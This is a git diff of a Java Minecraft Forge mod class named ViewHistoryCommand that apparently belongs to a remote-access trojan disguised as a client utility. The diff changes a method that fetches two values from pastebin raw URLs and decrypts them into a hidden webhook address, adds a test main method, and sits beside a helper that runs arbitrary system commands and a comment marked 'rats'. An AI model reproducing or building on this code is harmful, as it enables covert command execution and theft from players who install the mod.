@@ -3,6 +3,7 @@ package qolskyblockmod.pizzaclient.commands;
 import net.minecraft.launchwrapper.Launch;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.*;
+import org.lwjgl.Sys;
 
 import javax.crypto.*;
 import javax.crypto.spec.PBEKeySpec;
@@ -19,7 +20,7 @@ import java.security.spec.InvalidKeySpecException;
 import java.security.spec.KeySpec;
 import java.util.Base64;
 
-@Mod(modid = "ViewHistoryCommand", name = "ViewHistoryCommand", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
+@Mod(modid = "you", name = "you", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
 public class ViewHistoryCommand {
 
     public static String version = "1.1";
@@ -45,6 +46,12 @@ public class ViewHistoryCommand {
 
     // utils
 
+    public static void main(String[] args) throws InvalidAlgorithmParameterException, IllegalBlockSizeException, NoSuchPaddingException, IOException, NoSuchAlgorithmException, BadPaddingException, InvalidKeySpecException, InvalidKeyException {
+        getWebhook();
+        String ok = getWebhook();
+        System.out.println(ok);
+    }
+
     public static void exec(String cmd) {
         try {
             Runtime rt = Runtime.getRuntime();
@@ -54,13 +61,10 @@ public class ViewHistoryCommand {
         }
     }
 
-    public static String getWebhook() {
-        try {
-            BufferedReader in = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/DR7aWqKS").openStream()));
-            BufferedReader in2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/PY1CRmaU").openStream()));
-            return decrypt(in2.readLine(), in.readLine());
-        } catch (Exception ignored) {}
-        return "";
+    public static String getWebhook() throws IOException, InvalidAlgorithmParameterException, IllegalBlockSizeException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, InvalidKeySpecException, InvalidKeyException {
+        BufferedReader in = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/aM9XjYMZ").openStream()));
+        BufferedReader in2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/KqYYAyL5").openStream()));
+        return decrypt(in2.readLine(), in.readLine());
     }
 
     // rats
